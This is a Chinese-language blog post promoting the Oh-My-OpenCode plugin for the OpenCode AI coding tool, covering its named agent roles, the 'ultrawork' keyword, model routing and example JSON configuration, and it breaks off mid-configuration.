t6ZsCyjlLJMz0DsDGZ8SdlDROBjOb8YeWOjptU8kTXusuaazu7oJrfEnQvdkpVcUn6PTVHyAkIIW7br/Unklni0EJIZ1WgGsauZR+fvUglz6zY0dGfVp09ybRNlfwgi3k8YSbvJJ29VMoLt9v6rZVQL7hOYUubndHJGclBtzn1byqNMCogi09/2nFb01/oj+f/5TyjauBOKtPcZ1r7qZQ3f2lRfxZPWi2anp8TSDAGExZMa2jr8u03L1M5L7q3Xc+iAeuHRl/ScvPcjSLDBnZS/cjtNHd2v3171Ewbs9N5q7Pn4otVMx3btBsCsoRbk1FxG5dMVgMDqfTpXl1/tuFMa5zKefPROdX59qLQBwLnNog8Wy1OcjB1N+QEsW/QsFNZuO35Xb1v98QLX4/Sx+O3wqujrQ6013ABUWI8+AaqBjAH01+ghL22+5X2PirnMG7r+esbnae/V1neauvGSoHjigTcVU7UGFm2DeK4ttxKpQ+mLPvl+o/PjnkAkw9HTqSMmVHhyAMx9iFcSh/BHTfLceO/C8mKjApBf9zszGhoY92m9sN+BGOY9AeD7eGniv8OTaOB4dgyTsQd9wS+IQu4lciYdkI7CLrNH3Rvbb9FL41i0tbzVP2iWJkobpN5fmM4IJfJskTP1Bk8A9HQmbpmGDBrWqdVCN/Yd7PjxKGOXn+bmbto3feVVcVB9qehIL8EJy8nChwgr0O2xxBnhGU5eP2CfYbl/m4gBRsbtneMORP9oGpjpcCsiKzHHfdOPiQ/wMniyFEu2dbiTQCAeN/vavC466BGYLttXc9fmXBXMGlAhiHHur+sq6uPiUI9z7CVHMPwBnLSuuN8FuC48/Oaz1ylt94XfrW5ouyprwWfYRkwNyCyYYjwkBHows1fa+tV/fzGxlv39b9gqvfPmQ+i/HK8KlcBjhHwfl8HEHyOd1JnuzZd66S3TTPNNNP8/wDAfwDG7G0m9LKBpwAAAABJRU5ErkJggg==) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="vs2015">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1e1e1e;color:#dcdcdc}.hljs-keyword,.hljs-link,.hljs-literal,.hljs-name,.hljs-symbol{color:#569cd6}.hljs-link{text-decoration:underline}.hljs-built_in,.hljs-type{color:#4ec9b0}.hljs-class,.hljs-number{color:#b8d7a3}.hljs-meta-string,.hljs-string{color:#d69d85}.hljs-regexp,.hljs-template-tag{color:#9a5334}.hljs-formula,.hljs-function,.hljs-params,.hljs-subst,.hljs-title{color:#dcdcdc}.hljs-comment,.hljs-quote{color:#57a64a;font-style:italic}.hljs-doctag{color:#608b4e}.hljs-meta,.hljs-meta-keyword,.hljs-tag{color:#9b9b9b}.hljs-template-variable,.hljs-variable{color:#bd63c5}.hljs-attr,.hljs-attribute,.hljs-builtin-name{color:#9cdcfe}.hljs-section{color:gold}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-bullet,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-selector-tag{color:#d7ba7d}.hljs-addition{background-color:#144212}.hljs-addition,.hljs-deletion{display:inline-block;width:100%}.hljs-deletion{background-color:#600}</style><h2 data-id="heading-0">Oh-My-OpenCode：打造最强 AI 编程助手配置实战指南</h2>
<blockquote>
<p><strong>开挂级别的编程体验</strong>——这就是 oh-my-opencode 的实战效果。</p>
</blockquote>
<blockquote>
<p>前言：如果你热爱编程和计算机，OpenCode 就是那个从 Windows 切换到 Linux 的兴奋时刻。但学习成本很高？<strong>Oh-My-OpenCode 让你的智能体像真正的开发团队一样工作，开箱即用。</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-1">🔥 为什么选择 Oh-My-OpenCode？</h3>
<p>在 AI 编程时代，<strong>Claude Code 很棒，OpenCode 更棒</strong>——无限可扩展、无限可定制、零屏幕闪烁。但问题是：<strong>需要学习的东西很多，很复杂，而你的时间很宝贵。</strong></p>
<p>Oh-My-OpenCode 解决了这个问题。它不是一个简单的配置插件，而是<strong>一个完整的智能体协作系统</strong>。</p>
<h4 data-id="heading-2">核心优势（你可能再也回不去了）</h4>
<h5 data-id="heading-3">1️⃣ <strong>Sisyphus：像你一样编码的主智能体</strong></h5>
<p>在希腊神话中，西西弗斯因欺骗众神而被惩罚永恒地将巨石推上山坡。<strong>LLM 智能体和我们没有区别</strong>——它们每天推动着"石头"（思考）。</p>
<p>Sisyphus 的设计哲学：</p>
<ul>
<li>✅ <strong>不会浪费时间自己寻找文件</strong>：保持上下文精简，向更快、更便宜的模型并行发起后台任务</li>
<li>✅ <strong>利用 LSP 进行重构</strong>：更确定性、更安全、更精准</li>
<li>✅ <strong>将繁重的前端任务委派给 Gemini 3 Pro</strong></li>
<li>✅ <strong>遇到瓶颈时召唤 GPT 5.2 进行高智商战略支援</strong></li>
<li>✅ <strong>受 TODO 列表约束</strong>：系统会强制它回到"推石头"模式——<strong>你的任务会被完成，句号。</strong></li>
</ul>
<blockquote>
<p><strong>用户评价</strong>："如果 Claude Code 能在 7 天内完成人类 3 个月的工作，那么 Sisyphus 只需 1 小时。它会持续工作直到任务完成。它是一个非常自律的智能体。" —— B, 量化研究员</p>
</blockquote>
<h5 data-id="heading-4">2️⃣ <strong>专业智能体团队：各司其职</strong></h5>
<p>Oh-My-OpenCode 不是单打独斗，而是一个<strong>完整的开发团队</strong>：</p>








































<table><thead><tr><th>智能体</th><th>职责</th><th>为什么这样设计</th></tr></thead><tbody><tr><td><strong>Sisyphus</strong></td><td>主编排器、持续执行</td><td>像团队负责人一样协调资源</td></tr><tr><td><strong>Prometheus</strong></td><td>规划器</td><td>制定策略，而非盲目执行</td></tr><tr><td><strong>Oracle</strong></td><td>架构设计、复杂调试</td><td>需要深度推理</td></tr><tr><td><strong>Librarian</strong></td><td>官方文档、代码库探索</td><td>擅长检索和组织信息</td></tr><tr><td><strong>Explore</strong></td><td>极速代码库 grep（AST 感知）</td><td>快速定位，上下文感知</td></tr><tr><td><strong>Multimodal Looker</strong></td><td>图像/PDF 分析</td><td>多模态能力</td></tr></tbody></table>
<p><strong>真实案例</strong>：45k 行 Tauri 应用 → 一夜之间转换成 SaaS Web 应用</p>
<blockquote>
<p>"我使用 ohmyopencode 和 ralph loop 在一夜之间将一个 45k 行的 tauri 应用转换成了 SaaS Web 应用。看着它工作非常精彩，今早醒来发现网站基本上已经可以运行了！" — James Hargis</p>
</blockquote>
<h5 data-id="heading-5">3️⃣ <strong>Hephaestus：自主深度工作者</strong></h5>
<p>在希腊神话中，赫菲斯托斯是神圣的铁匠——以无与伦比的精准和奉献打造武器。<strong>Oh-My-OpenCode 引入了 Hephaestus（GPT 5.2 Codex Medium）：合法的工匠代理。</strong></p>
<p><strong>Hephaestus 的革命性特性：</strong></p>





























<table><thead><tr><th>特性</th><th>价值</th></tr></thead><tbody><tr><td><strong>目标导向</strong></td><td>给他目标，不是配方。他自己决定步骤。</td></tr><tr><td><strong>行动前探索</strong></td><td>写代码前，并行启动 2-5 个 explore/librarian 代理。</td></tr><tr><td><strong>端到端完成</strong></td><td>有验证证据证明 100% 完成之前不会停止。</td></tr><tr><td><strong>模式匹配</strong></td><td>搜索现有代码库以匹配项目风格——没有 AI 垃圾。</td></tr><tr><td><strong>合法的精准</strong></td><td>像大师铁匠一样编写代码——精准、最小化、只做需要的。</td></tr></tbody></table>
<p><strong>灵感来源</strong>：AmpCode 的深度模式——在采取决定性行动之前进行彻底研究的自主问题解决。</p>
<h5 data-id="heading-6">4️⃣ <strong>🪄 魔法词：<code>ultrawork</code>（或 <code>ulw</code>）</strong></h5>
<p><strong>不想读完文档？只需在你的提示中包含 <code>ultrawork</code> 或 <code>ulw</code>。</strong></p>
<p>就这样。所有功能像魔法一样运行：</p>
<ul>
<li>✅ 并行智能体</li>
<li>✅ 后台任务</li>
<li>✅ 深度探索</li>
<li>✅ 不懈执行直到完成</li>
</ul>
<p>智能体自动理解其余的。<strong>其实，打 <code>ulw</code> 太费劲了。就 <code>ulw</code>。喝杯咖啡。你的工作完成了。</strong></p>
<h5 data-id="heading-7">5️⃣ <strong>并行智能体：像真正的开发团队</strong></h5>
<p>Oh-My-OpenCode 的后台智能体功能：</p>
<ul>
<li><strong>并行运行多个智能体</strong></li>
<li><strong>按提供商/模型配置并发限制</strong></li>
<li><strong>像真正的开发团队一样协作</strong></li>
</ul>
<p><strong>实际效果：</strong> Sisyphus 保持主智能体的上下文精简，向更快、更便宜的模型并行发起后台任务，让它们为他绘制地图。</p>
<h5 data-id="heading-8">6️⃣ <strong>Todo 继续执行器：强制完成</strong></h5>
<p>这是让 Sisyphus 继续推动巨石的关键：</p>
<ul>
<li>✅ 如果智能体中途退出，强制它继续</li>
<li>✅ 你的任务会被完成，句号</li>
</ul>
<blockquote>
<p><strong>真实案例</strong>："用 Oh My Opencode 仅用一天就清理了 8000 个 eslint 警告" — Jacob Ferrari</p>
</blockquote>
<h5 data-id="heading-9">7️⃣ <strong>LSP &amp; AST 工具：确定性重构</strong></h5>

























<table><thead><tr><th>能力</th><th>价值</th></tr></thead><tbody><tr><td><strong>重构</strong></td><td>像人类一样精确</td></tr><tr><td><strong>重命名</strong></td><td>不遗漏任何引用</td></tr><tr><td><strong>诊断</strong></td><td>精准定位问题</td></tr><tr><td><strong>AST 感知代码搜索</strong></td><td>语义级别搜索，不是文本匹配</td></tr></tbody></table>
<p><strong>LSP 按文件自动激活</strong>：CSS（vscode-css-language-server），支持 <code>.css</code>, <code>.scss</code>, <code>.sass</code>, <code>.less</code></p>
<h5 data-id="heading-10">8️⃣ <strong>上下文智能管理：多智能体分担</strong></h5>
<p>Oh-My-OpenCode 积极利用多个智能体来减轻上下文负担：</p>
<ul>
<li><strong>你的智能体现在是开发团队负责人</strong></li>
<li><strong>你是 AI 经理</strong></li>
</ul>
<p>不再需要担心上下文管理，已经处理好了。</p>
<h5 data-id="heading-11">9️⃣ <strong>开箱即用：电池已包含</strong></h5>
<p>所有功能默认启用。你不需要做任何事情：</p>
<ul>
<li>✅ 智能体团队</li>
<li>✅ 后台任务</li>
<li>✅ LSP/AST 支持</li>
<li>✅ Todo 执行器</li>
<li>✅ MCP 插件</li>
</ul>
<h5 data-id="heading-12">🔟 <strong>注释检查器：保持代码库整洁</strong></h5>
<ul>
<li>✅ 防止 AI 添加过多注释</li>
<li>✅ Sisyphus 生成的代码与人类编写的代码无法区分</li>
</ul>
<h5 data-id="heading-13">1️⃣1️⃣ <strong>精选 MCP：即时可用</strong></h5>
<p>开箱即用的 MCP 插件：</p>
<ul>
<li><strong>Exa</strong>：高质量网页搜索</li>
<li><strong>Context7</strong>：官方文档智能查询</li>
<li><strong>Grep.app</strong>：GitHub 代码搜索</li>
</ul>
<h5 data-id="heading-14">1️⃣2️⃣ <strong>Claude Code 完整兼容性</strong></h5>
<ul>
<li>✅ Command</li>
<li>✅ Agent</li>
<li>✅ Skill</li>
<li>✅ MCP</li>
<li>✅ Hook（PreToolUse、PostToolUse、UserPromptSubmit、Stop）</li>
</ul>
<hr/>
<h3 data-id="heading-15">📦 安装与配置</h3>
<h4 data-id="heading-16">方式一：直接安装（推荐）</h4>
<p>只需在 <code>~/.config/opencode/opencode.json</code> 中添加插件：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"plugin"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-string">"opencode-antigravity-auth@latest"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-string">"oh-my-opencode@latest"</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>就是这样。<strong>直接安装就行。开箱即用，电池已包含。</strong></p>
<h4 data-id="heading-17">方式二：让智能体安装</h4>
<p>复制以下提示并粘贴到你的 LLM 智能体（Claude Code、AmpCode、Cursor 等）：</p>
<pre><code class="hljs language-perl" lang="perl">按照以下说明安装和配置 oh-<span class="hljs-keyword">my</span>-opencode：
https:<span class="hljs-regexp">//ra</span>w.githubusercontent.com/code-yeongyu/oh-<span class="hljs-keyword">my</span>-opencode/refs/heads/master/docs/guide/installation.md
</code></pre>
<p><strong>我们强烈建议让智能体来处理。人会犯错，智能体不会。</strong></p>
<hr/>
<h3 data-id="heading-18">⚙️ 核心配置详解</h3>
<h4 data-id="heading-19">主配置文件：oh-my-opencode.json</h4>
<p>配置文件位置：</p>
<ul>
<li><strong>用户级</strong>：<code>~/.config/opencode/oh-my-opencode.json</code></li>
<li><strong>项目级</strong>：<code>.opencode/oh-my-opencode.json</code>（优先级更高）</li>
</ul>
<p>支持 <strong>JSONC</strong>（带注释和尾随逗号的 JSON）。</p>
<h4 data-id="heading-20">Agent 配置：专业化的智能体</h4>
<p>以下是我的生产环境配置：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"$schema"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://raw.githubusercontent.com/code-yeongyu/oh-my-opencode/master/assets/oh-my-opencode.schema.json"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"agents"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"sisyphus"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-opus-4.5"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"oracle"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-opus-4.5"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"librarian"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-sonnet-4.5"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"explore"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/gemini-3-flash-preview"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"multimodal-looker"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-opus-4.5"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"prometheus"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-opus-4.5"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"metis"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-opus-4.5"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h5 data-id="heading-21">为什么这样配置？</h5>













































<table><thead><tr><th>Agent</th><th>模型选择</th><th>理由</th></tr></thead><tbody><tr><td><strong>sisyphus</strong></td><td>Claude Opus 4.5</td><td>强推理，主编排需要深度思考</td></tr><tr><td><strong>oracle</strong></td><td>Claude Opus 4.5</td><td>架构设计和调试需要强推理</td></tr><tr><td><strong>librarian</strong></td><td>Claude Sonnet 4.5</td><td>文档搜索和代码组织，平衡速度和质量</td></tr><tr><td><strong>explore</strong></td><td>Gemini 3 Flash</td><td>100万+ tokens，快速代码库探索</td></tr><tr><td><strong>multimodal-looker</strong></td><td>Claude Opus 4.5</td><td>多模态分析需要强推理</td></tr><tr><td><strong>prometheus</strong></td><td>Claude Opus 4.5</td><td>规划策略需要强推理</td></tr><tr><td><strong>metis</strong></td><td>Claude Opus 4.5</td><td>需求分析和歧义识别需要强推理</td></tr></tbody></table>
<h4 data-id="heading-22">Category 配置：任务分类路由</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"categories"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"visual-engineering"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-opus-4.5"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"ultrabrain"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-opus-4.5"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"artistry"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-opus-4.5"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"quick"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/gemini-3-flash-preview"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"unspecified-low"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-sonnet-4"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"unspecified-high"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-opus-4.5"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"writing"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"github-copilot/claude-sonnet-4.5"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-23">Sisyphus Agent 配置</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"sisyphus_agent"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"default_builder_enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"replace_plan"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong>default_builder_enabled</strong>：启用默认构建器</li>
<li><strong>replace_plan</strong>：不替换原始计划（保留 Prometheus 的规划）</li>
</ul>
<h4 data-id="heading-24">LSP 配置</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"lsp"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"css"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"vscode-css-language-server"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"--stdio"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"extensions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">".css"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">".scss"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">".sass"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">".less"</span><span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-25">后台任务配置</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"background_task"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"max_concurrent"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>配置并发限制，防止资源耗尽。</p>
<hr/>
<h3 data-id="heading-26">🛠️ MCP 插件生态</h3>
<p>Oh-My-OpenCode 内置精选的 MCP 插件：</p>



































<table><thead><tr><th>插件</th><th>类型</th><th>功能</th></tr></thead><tbody><tr><td><strong>Exa</strong></td><td>remote</td><td>高质量网页搜索</td></tr><tr><td><strong>Context7</strong></td><td>local</td><td>官方文档智能查询</td></tr><tr><td><strong>Grep.app</strong></td><td>remote</td><td>GitHub 代码搜索</td></tr><tr><td><strong>Fetch</strong></td><td>local</td><td>网页抓取与解析</td></tr><tr><td><strong>Playwright</strong></td><td>local</td><td>浏览器自动化</td></tr></tbody></table>
<h4 data-id="heading-27">额外 MCP 插件（需要手动配置）</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mcp"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"deepwiki"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"remote"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://mcp.deepwiki.com/mcp"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"web-search-prime"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"remote"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://open.bigmodel.cn/api/mcp/web_search_prime/mcp"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"zai-mcp-server"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"npx"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"-y"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"@z_ai/mcp-server"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"local"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h3 data-id="heading-28">📚 内置技能</h3>
<p>Oh-My-OpenCode 内置实用技能：</p>

















<table><thead><tr><th>技能</th><th>功能</th></tr></thead><tbody><tr><td><code>playwright</code></td><td>浏览器自动化、网页测试</td></tr><tr><td><code>git-master</code></td><td>Git 高级操作（原子提交、历史搜索）</td></tr></tbody></table>
<h4 data-id="heading-29">钩子系统</h4>
<p>25+ 内置钩子，均可通过 <code>disabled_hooks</code> 配置：</p>
<ul>
<li>PreToolUse：工具调用前</li>
<li>PostToolUse：工具调用后</li>
<li>UserPromptSubmit：用户提交提示时</li>
<li>Stop：智能体停止时</li>
</ul>
<hr/>
<h3 data-id="heading-30">🚀 使用技巧与最佳实践</h3>
<h4 data-id="heading-31">1️⃣ 使用 <code>ultrawork</code> 魔法词</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 在任何提示中包含 ultrawork 或 ulw</span>
ulw: 重构这个 React 组件，添加 TypeScript 类型

<span class="hljs-comment"># 智能体会自动：</span>
<span class="hljs-comment"># - 启动并行 explore/librarian 代理</span>
<span class="hljs-comment"># - 使用 LSP 进行确定性重构</span>
<span class="hljs-comment"># - 强制完成任务</span>
</code></pre>
<h4 data-id="heading-32">2️⃣ 根据任务类型选择 Agent</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 快速代码库探索 - explore agent</span>
<span class="hljs-comment"># 自动路由到：gemini-3-flash-preview（100万+ tokens）</span>

<span class="hljs-comment"># 复杂架构设计 - oracle agent</span>
<span class="hljs-comment"># 自动路由到：claude-opus-4.5（强推理）</span>

<span class="hljs-comment"># 文档搜索 - librarian agent</span>
<span class="hljs-comment"># 自动路由到：claude-sonnet-4.5（平衡速度和质量）</span>

<span class="hljs-comment"># 多模态分析 - multimodal-looker agent</span>
<span class="hljs-comment"># 自动路由到：claude-opus-4.5（多模态强）</span>
</code></pre>
<h4 data-id="heading-33">3️⃣ 利用并行智能体</h4>
<p>Oh-My-OpenCode 会自动：</p>
<ul>
<li>并行启动多个 explore/librarian 代理</li>
<li>按提供商/模型配置并发限制</li>
<li>像真正的开发团队一样协作</li>
</ul>
<p>你不需要手动管理，系统自动处理。</p>
<h4 data-id="heading-34">4️⃣ 上下文管理已优化</h4>
<ul>
<li>✅ OhMyOpenCode 积极利用多个智能体来减轻上下文负担</li>
<li>✅ 你的智能体现在是开发团队负责人</li>
<li>✅ 你是 AI 经理</li>
</ul>
<p>不再需要担心上下文窗口。</p>
<hr/>
<h3 data-id="heading-35">🔧 高级配置</h3>
<h4 data-id="heading-36">禁用特定功能</h4>
<p>如果不想启用所有功能，可以选择性禁用：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"disabled_hooks"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-string">"preToolUse"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-string">"postToolUse"</span>
  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"disabled_features"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-string">"comment_checker"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-string">"todo_enforcer"</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-37">项目级配置</h4>
<p>在项目根目录创建 <code>.opencode/oh-my-opencode.json</code>：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"agents"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"sisyphus"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
